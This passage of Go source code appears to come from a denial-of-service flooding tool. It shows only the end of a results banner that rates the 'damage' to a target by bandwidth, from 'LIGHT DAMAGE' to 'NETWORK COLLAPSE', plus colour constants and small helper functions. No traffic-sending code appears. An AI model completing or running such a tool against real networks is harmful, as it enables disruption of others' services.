    fmt.Printf("║  ⚡ PEAK GBPS:           %.2f Gbps                                           ║\n", float64(peakBandwidth)/1000)
    fmt.Printf("║                                                                                                  ║\n")
    
    // Impact assessment
    impact := ""
    if avgGBPS > 100 {
        impact = fmt.Sprintf("%s💀💀💀 APOCALYPSE - NETWORK COLLAPSE 💀💀💀%s", COLOR_RED, COLOR_RESET)
    } else if avgGBPS > 50 {
        impact = fmt.Sprintf("%s💀💀 TARGET DESTROYED 💀💀%s", COLOR_RED, COLOR_RESET)
    } else if avgGBPS > 20 {
        impact = fmt.Sprintf("%s💀 TARGET DOWN 💀%s", COLOR_RED, COLOR_RESET)
    } else if avgGBPS > 10 {
        impact = fmt.Sprintf("%s⚠️ TARGET CRASHED ⚠️%s", COLOR_YELLOW, COLOR_RESET)
    } else if avgGBPS > 5 {
        impact = fmt.Sprintf("%s⚠️ TARGET LAGGING ⚠️%s", COLOR_YELLOW, COLOR_RESET)
    } else if avgGBPS > 1 {
        impact = fmt.Sprintf("%sℹ️ LIGHT DAMAGE ℹ️%s", COLOR_BLUE, COLOR_RESET)
    } else {
        impact = fmt.Sprintf("%s✅ NO DAMAGE ✅%s", COLOR_GREEN, COLOR_RESET)
    }
    
    fmt.Printf("║  %-80s ║\n", impact)
    fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════════════════════════╝\n")
}

// Color codes (for impact assessment)
var (
    COLOR_RED   = "\033[91m"
    COLOR_GREEN = "\033[92m"
    COLOR_YELLOW = "\033[93m"
    COLOR_BLUE  = "\033[94m"
    COLOR_RESET = "\033[0m"
)

func formatNumber(n int64) string {
    if n < 1000 {
        return fmt.Sprintf("%d", n)
    }
    if n < 1000000 {
        return fmt.Sprintf("%.1fK", float64(n)/1000)
    }
    if n < 1000000000 {
        return fmt.Sprintf("%.1fM", float64(n)/1000000)
    }
    if n < 1000000000000 {
        return fmt.Sprintf("%.1fB", float64(n)/1000000000)
    }
    return fmt.Sprintf("%.1fT", float64(n)/1000000000000)
}

func randomString(length int) string {
    chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    result := make([]byte, length)
    for i := range result {
        result[i] = chars[rand.Intn(len(chars))]
    }
    return string(result)
}
